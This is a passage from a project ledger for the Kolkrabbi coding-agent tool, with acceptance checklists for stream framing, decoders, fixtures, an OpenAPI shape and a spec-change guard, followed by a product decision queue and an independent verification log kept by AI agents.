- No installer publication, release tag, repository-visibility change, deployment, or clean-machine
  rehearsal.

Acceptance checklist:

- [x] the framing document gives exact byte grammars and states the NDJSON/SSE data identity rule.
- [x] NDJSON encoding is exactly `Encode(envelope)` plus one LF; SSE encoding is exactly decimal
  id, wire event, identical data, and one terminating blank line.
- [x] Unicode and escaped embedded newlines remain one physical NDJSON/data line with no CR bytes.
- [x] invalid envelopes fail before emitting either transport form.
- [x] heartbeat bytes are exact and returned through defensive storage.
- [x] the public package remains standard-library-only and disconnected from existing packages.
- [x] focused tests, architecture gates, full repository gates, and the build log are green.

#### A6.4b1 bounded decoder grammar acceptance

Scope:

- Add one callback-based public stream decoder with explicit NDJSON and SSE formats; it retains no
  event collection and stops immediately when the callback returns an error.
- Bound each decoded envelope JSON frame to 1 MiB without relying on `bufio.Scanner`'s implicit
  64 KiB ceiling or an unbounded `ReadString` allocation.
- Accept only complete LF-terminated NDJSON lines and complete Kolkrabbi SSE blocks. Ignore only
  the exact `: ping\n\n` heartbeat block.
- Verify canonical SSE `id` and `event` metadata against the decoded envelope before delivery.

Non-goals:

- No whole-turn conformance fixture, sequence-contiguity policy, event collection, replay cursor,
  `retry` field, `Last-Event-ID`, reconnect, HTTP response, flush, bus, daemon, or CLI integration.
- No general-purpose WHATWG SSE parser: CRLF, multiline `data`, reordered fields, unknown comments,
  extension fields, and unterminated final lines/blocks are outside Kolkrabbi's exact wire grammar.
- No command-direction stream, provider-vendor stream, installer publication, release tag,
  deployment, or clean-machine rehearsal.

Acceptance checklist:

- [x] NDJSON and SSE streams deliver validated envelopes in order without accumulating a result
  slice; empty streams succeed.
- [x] only LF-terminated frames/blocks are accepted; blank NDJSON lines, CR bytes, transport
  whitespace, partial EOF frames, malformed envelopes, and malformed SSE structure fail closed.
- [x] exact heartbeat blocks are ignored; other comments and malformed heartbeats fail closed.
- [x] SSE IDs are canonical unsigned decimal and equal envelope sequence; SSE event names equal the
  envelope type before the callback runs.
- [x] frames of exactly 1 MiB are accepted in both transports and a one-byte-larger frame returns a
  stable size-limit error without invoking its callback.
- [x] callback errors stop reading immediately and are returned without losing identity.
- [x] the public package remains standard-library-only and disconnected from existing packages.
- [x] focused tests, architecture gates, full repository gates, and the build log are green.

#### A6.4b2a owner-stable turn streams acceptance

Scope:

- Add canonical `code-turn`, `permission-denied`, and `agent-fanout` NDJSON fixtures under
  `spec/testdata/streams/`, each with an exact SSE twin derived from the same envelope bytes.
- Require each fixture to be one session log with contiguous positive sequence numbers, monotonic
  timestamps, complete LF/block termination, validated event payloads, and an explicit terminal
  `turn.finished`.
- Freeze semantic ordering for a simple streamed answer, a denied Kolkrabbi-owned tool, and one
  parent/child agent turn with correlated task/turn identities and per-attempt usage rows.

Dependency blockers:

- `saga-chapter` remains absent until A6.2d2/PLAN item 10 owns chapter state and terminal outcomes.
- `resume-after-drop` remains absent until A7/A11 own retained-log cursors, replay, and
  `cursor_expired`; a static fixture must not guess those semantics first.

Non-goals:

- No event producer, sequence allocator, clock, bus, engine integration, CLI stream flag, server,
  HTTP response, heartbeat insertion, cursor/replay, command stream, or fixture generator.
- No claim that all future stream scenarios ship; only owner-stable scenarios may enter the exact
  fixture inventory.

Acceptance checklist:

- [x] the stream directory contains exactly three `.ndjson`/`.sse` basename pairs and no orphan or
  deferred placeholder.
- [x] every NDJSON byte stream equals concatenated `EncodeNDJSON` output; every SSE stream equals
  concatenated `EncodeSSE` output over the same decoded envelopes.
- [x] both decoders return byte-identical ordered envelopes with sequence 1..N, one session,
  monotonic timestamps, and the declared event-type sequence.
- [x] code-turn completes streamed reasoning/text plus authoritative message and one usage row before
  terminal turn completion.
- [x] permission-denied correlates one Kolkrabbi tool request, deny decision, and unsuccessful finish
  without a false `tool.started` event.
- [x] agent-fanout correlates task and child-turn identities, scopes child events to the child turn,
  returns to the parent for subagent completion, and accounts for child and parent attempts.
- [x] the public package remains standard-library-only; focused, race, architecture, lint, and full
  repository gates pass with the result recorded.

#### A6.4c minimal OpenAPI shape acceptance

Scope:

- Publish one OpenAPI 3.1 document for only `GET /v1/hello`,
  `POST /v1/turns/{id}/cancel`, and `POST /v1/permissions/{id}`.
- Reuse the shipped hello and error schemas by reference. Derive REST path identifiers and the
  permission-decision body exactly from the corresponding shipped command schemas, without making
  clients send the same identifier twice.
- Make the operation-to-command relationship machine-readable and use the shared error entity for
  every non-success response.
- Require bearer authentication globally, with `GET /v1/hello` as the one explicit unauthenticated
  protocol-shape check.

Dependency blockers:

- `POST /v1/turns`, session list/detail, and session event replay remain absent until A10 freezes
  session creation and persisted projections and A7/A11 own retained-log cursor semantics.
- Model, stats, and dashboard paths remain absent until their provider catalog and persistence
  owners publish stable entities.

Non-goals:

- No HTTP server, handler, router, bearer-token implementation, event bus, SSE response, cursor,
  replay, generated client, request dispatch, engine integration, or CLI behavior change.
- No duplicate HTTP-only command schema and no speculative response body or conflict/idempotency
  policy for either mutation.
- No credential, key, login, or auth-management route; bearer is only a security scheme.
- No installer publication, release tag, repository-visibility change, deployment, or clean-machine
  rehearsal.

Acceptance checklist:

- [x] the document is valid OpenAPI 3.1 using JSON Schema 2020-12 and declares exactly the three
  owner-stable paths and methods.
- [x] hello returns the shipped hello schema, explicitly opts out of global bearer auth, and all
  mutations inherit the one HTTP bearer scheme.
- [x] turn cancellation has one canonical path ID and no request body; permission resolution has
  one non-empty opaque path ID and a body containing exactly the shipped decision vocabulary.
- [x] the two mutation operations map exactly once to the two-command catalog and return 204 on
  success with no invented response body.
- [x] every operation routes its default failure through the shipped shared error entity; external
  schema references resolve inside `spec/` and do not duplicate their source contracts.
- [x] no deferred or secret-management path appears, and no dependency or runtime package is added.
- [x] focused tests, architecture gates, full repository gates, and the build log are green.

#### A6.4d spec-change guard and owner-stable A6 closure acceptance

Scope:

- Add one exhaustive recursive inventory of every regular file currently owned by `spec/`, deriving
  event and command entries from their shipped catalogs and rejecting orphan, missing, hidden, or
  irregular contract artifacts.
- Add one offline Git tree-to-tree guard: if any committed `spec/` path changes, the same comparison
  must change the still-present `spec/CHANGELOG.md`.
- Run the inventory and black-box guard matrix through a named Make target, ordinary CI, and a
  read-only path-filtered spec workflow with full Git history.
- Close the owner-stable A6 transport cut while leaving explicitly dependency-blocked vocabulary,
  entity, command, saga, session, cursor, server, and generated-client work open under its owners.

Non-goals:

- No third-party YAML/OpenAPI linter, schema generator, generated client, protocol-version bump,
  semantic-version policy, automatic changelog editing, or enforcement based on uncommitted files.
- No requirement that every `protocol/` implementation-only edit change the language-neutral spec;
  conformance and inventory tests remain the shape-drift guard in that direction.
- No event bus, engine integration, persistence migration, HTTP/stdio server, installer publication,
  release tag, repository-visibility change, deployment, or clean-machine rehearsal.

Acceptance checklist:

- [x] the recursive inventory equals the exact expected regular-file set and is generated from the
  event/command catalogs plus the explicit entity, stream, foreign-fixture, and top-level sets.
- [x] the Git guard accepts no-spec and changelog-accompanied diffs, rejects added/modified/deleted
  spec changes without the changelog, rejects a missing changelog and invalid treeish, and ignores
  uncommitted working-tree noise.
- [x] the guard handles an explicit base and head without network access or mutation and emits a
  concise reason for pass or failure.
- [x] `.github/workflows/spec.yml` is path-filtered, fetches full history, uses pinned read-only
  actions, runs the named spec gate, and compares the event base to the checked-out head.
- [x] ordinary CI and `make check` also run the named gate so workflow-filter edits cannot bypass it.
- [x] protocol version remains `0`, no runtime/dependency surface changes, and all dependency-gated
  contracts remain absent.
- [x] focused black-box, protocol, architecture, lint, workflow, and full repository gates pass with
  the final owner-stable A6 result recorded.

#### A6.2a streamed deltas acceptance

Scope:

- Define the `message.delta` and `reasoning.delta` event names as public Go constants.
- Define their shared wire shape as a required, non-empty `text` string while retaining unknown
  payload fields for version-0 forward compatibility.
- Give both events a language-neutral JSON Schema, a compact golden envelope, and a typed Go
  payload that conform to one another.

Non-goals:

- No lifecycle, completed-message, tool, permission, orchestration, accounting, or diagnostic
  payload decisions.
- No provider translation, event bus, stream transport, engine integration, or CLI output change.
- No installer, repository visibility, tag, release, Pages, or deployment mutation.

Acceptance checklist:

- [x] event constant values exactly match the schema filenames and golden-envelope `type` values.
- [x] both schemas require non-empty `text` and permit unknown fields.
- [x] both typed payloads decode their golden text and each complete envelope round-trips
  byte-for-byte.
- [x] known delta events reject missing, empty, null, or non-string text while a syntactically
  valid unknown event remains forward-compatible.
- [x] the public package remains standard-library-only and disconnected from existing packages.
- [x] focused tests, architecture gates, full repository gates, and the build log are green.

## Product decision queue

Each item is hardened independently in its own `docs/plan/NN-*.md` before its implementation
checkpoint is expanded. Status here mirrors [`PLAN.md`](PLAN.md); PLAN remains authoritative.

- [~] 1 identity, repository, and release skeleton
- [x] 2 language and architecture
- [x] 3 provider layer
- [x] 4 subscription backends
- [x] 5 authentication, keys, and secrets
- [x] 6 modes — hardened; doc complete, code claims verified against the tree (ox-alpha review 2026-08-24)
- [x] 7 effort dial — hardened; doc complete (docs/plan/07-effort-dial.md), 4-level low/medium/high/max dial + numeric/legacy aliases, 5-knob matrix
- [x] 8 model selection and routing — hardened; doc complete (docs/plan/08-model-routing.md), free coding model ranking, vendor aliases, zero-cost fast lane
- [x] 9 command surface — hardened; doc complete (docs/plan/09-command-surface.md), strict CLI/slash parity, <= 6 char verbs, stream-json, reserve list
- [x] 10 saga — hardened; doc complete (docs/plan/10-saga-loop.md), chapter-by-chapter SAGA.md loop, shell quality gates, commit-on-green, doom-loop detector
- [x] 11 REPL/TUI — hardened; doc complete (docs/plan/11-repl-tui-input.md). Mirror corrected 2026-08-28.
- [x] 12 sessions, context, and memory — hardened; doc complete (docs/plan/12-sessions-context-memory.md),
  JSON storage kept, 75% compaction with tool output sacrificed first, overflow compacts and retries once
- [x] 13 tools, permissions, and sandboxing — hardened; doc complete (docs/plan/13-tools-permissions-sandboxing.md),
  path jail, hardline blocklist under yolo, scrubbed tool output, and subagent auto-deny ship;
  OS-level sandboxing is accepted v1 and pending V34.1e
- [x] 14 orchestration and per-task routing — hardened; doc complete (docs/plan/14-orchestration-routing.md). Mirror corrected 2026-08-28.
- [x] 15 code-mode specifics — hardened; doc complete (docs/plan/15-code-mode.md). Mirror corrected 2026-08-28.
- [x] 16 extensibility — hardened; doc complete (docs/plan/16-extensibility.md). Mirror corrected 2026-08-28.
- [x] 17 local dashboard — hardened; doc complete (docs/plan/17-local-dashboard.md). Mirror corrected 2026-08-28.
- [x] 18 config system — hardened; truncated draft completed by ox-alpha (§5 migration, §6 UX, §7 ship list, rationale sections) 2026-08-24
- [x] 19 desktop and iPad path — hardened; doc complete (docs/plan/19-desktop-ipad.md). Mirror corrected 2026-08-28.
- [x] 20 distribution, updates, and CI — hardened; doc complete (docs/plan/20-distribution-updates-ci.md). Mirror corrected 2026-08-28.
- [x] 21 quality, testing, and security — hardened; doc complete (docs/plan/21-quality-testing-security.md). Mirror corrected 2026-08-28.
- [x] 22 onboarding and docs — hardened; doc complete (docs/plan/22-onboarding-docs.md). Mirror corrected 2026-08-28.
- [x] 23 roadmap, phasing, and non-goals — hardened; doc complete (docs/plan/23-roadmap-phasing-non-goals.md). Mirror corrected 2026-08-28.
- [~] 24 subscription provider matrix — doc complete (docs/plan/24-subscription-provider-matrix.md);
  Anthropic handover shipped under P11/B12, every other provider still open
- [~] 25 managed local models — contract complete (docs/plan/25-managed-local-models.md);
  L13.1–L13.3 shipped, hardware planner and `/localia` open

### Independent verification log (ox-alpha)

- 2026-08-24 00:25–00:35 — A7.2a work-in-progress state, verified by ox-alpha while codex owns
  the leaf: `go test -race ./internal/redact/... ./internal/bus/...` ok; 20 s fuzz on
  `FuzzScrubPreservesValidUTF8AndIdempotence` PASS (673k execs, no crashers); `make vet`,
  `make fmt-check`, `make buildtags`, `make platforms`, `make lint` clean; `make test`
  1222 tests green across all modules; `make budgets` (6.11 MB binary, 4.5 ms cold start,
  1222-test floor); `make spec` 29 checks; site 110 / surface 13 / installer 72 checks;
  release-check + workflow-check + verifier-check exit 0. No failures found; nothing edited
  in `internal/redact/*`.
- 2026-08-24 01:25–01:30 — second independent pass by ox-alpha over codex's expanded working tree
  (A7.2a redact scanner + A8 decision-port seam `internal/engine/decider.go` + U0.4a/b TUI work with
  the spike-approved `golang.org/x/term` behind `internal/term`): full `make check` exit 0 —
  1256 tests, lint 0 issues, budgets (2 third-party modules, at the enforced limit, not over),
  surface 13 / installer 72 / site 110 / spec 29 / release 24 / workflow 41 checks, Windows
  cross-build exit 0, `-race` clean on tui/cli/engine. Nothing edited outside docs; no failures.
- 2026-08-24 01:40 — item 18 closed by ox-alpha: `docs/plan/18-config.md` was truncated mid-Spec
  (ended at §4.9 while citing a §5 migration table, §7.3, §8/§8.6). Wrote the missing sections —
  §5 MIGRATION (three ordered migrations mapped to the live `paths.Migrate` and
  `keystore.MigrateLegacyConfig`, alias table with quick→low rename, crash-safe flattening,
  version field rejected), §6 UX SURFACE (verb grammar, aliases to today's `set-*`, no wizard),
  §7 SHIP LIST (7-step v0.1 order, named CI tests, gates incl. S5 extension), §7.4 cross-doc
  amendment, Rationale / Alternatives rejected / Risks & open questions / Sources. All claims
  verified against the tree (paths.go:82 symlink promise, cmd_config verbs, keystore fixture).
  PLAN.md item 18 → [x]; queue updated.
- 2026-08-24 02:10 — U0.4d Markdown/diff leaf closed by ox-alpha: implemented the missing
  deterministic transcript rendering as `internal/tui/markdown.go` (stdlib-only, composer token
  grammar) behind the existing `model.go` view seam, replacing the plain `wrapText` call; removed
  now-dead `wrapText`. Eight golden/model tests added (`markdown_test.go`). TDD record: red on all
  eight first (fence-consumption, spacer-row, and indent bugs found by the tests), green after
  three implementation fixes + two test-fixture corrections. Gates at 02:05–02:12: focused +
  `-race` tui/cli/engine ok; repo-wide `go test ./...` 23 pkgs ok (1291 root-module tests);
  `make lint` 0 issues; fmt-check, arch, platforms, budgets clean; surface/site/installer/spec
  script checks pass. Coordination: codex landed the spinner leaf (`internal/tui/spinner.go`,
  runtime wiring, cli default-model work) mid-leaf at 01:54–02:04; their files untouched, no
  overlap with this leaf's edits.
- 2026-08-24 02:53–03:05 — A7.2a independent verification by ox-alpha (verifier did not write the
  code), per codex's 02:38 handoff: race tests on redact/secret/arch all ok; 21 s fuzz PASS
  (84,820 execs, zero crashers); BenchmarkScrub12KiB 82.6 µs/op, 148.77 MB/s, 0 allocs/op; full
  `make check` exit 0 with 1,329 tests across all modules and every script contract green
  (surface 13 / site 110 / installer 72 / spec 29 / release 24 / workflow 41 / verifier 30);
  repo-wide vet clean. Also independently verified the published `v1.1.3` release while U0.4e was
  closing: workflow run 32693216415 verify+publish both success (142 test lines in CI logs, cosign
  keyless signature verified at publish), six assets live, fresh-download checksum OK,
  isolated `/tmp` rehearsal proved public `v1.1.2 → v1.1.3` update, second-run no-op update, and a
  fresh installer run into an overridden dir whose binary is byte-identical (sha256 match) to the
  updater's result; offline `cmd/kolk-mock` PTY rehearsal via expect confirmed one-cell braille
  spinner, no octopus/phase text, durable transcript, cost footer, composer-only first Ctrl+C, and
  double-Ctrl+C exit on v1.1.3. Evidence recorded under the U0.4e acceptance box by codex; these
  runs were ox-alpha's independent pass. No failures found.

- 2026-08-26 04:50–05:05 — independent review pass by claude (opus-5), no production code written.
  Read-only inspection of the tree, the ledger, and the prior Copilot session records, then a full
  `make check`: exit 0 with 1,541 root-module tests, darwin/linux amd64+arm64 plus advisory
  windows/amd64, 0 lint issues, 2 third-party modules, binary 7.91 MB (soft budget 12 MB, hard
  20 MB), cold start 2.9 ms p50, and site 110 / surface 13 / installer 72 / spec 29 / release 24 /
  workflow 41 / verifier 30 checks. The four modified worktree files and the untracked
  `internal/cli/SAGA.md` were present and untouched during the run. Public releases `v1.1.12`,
  `v1.1.13`, and `v1.1.14` are published and their workflows are green; the `v1.1.11` tag exists but
  its release never published, so the version line skips it. Findings recorded above: S10.4 was
  closable and is now closed; P11/B12/L13 had shipped with no ledger entry and are now recorded;
  the binary grew from 6.27 MB (v1.1.5) to 7.91 MB, still inside budget but worth watching.
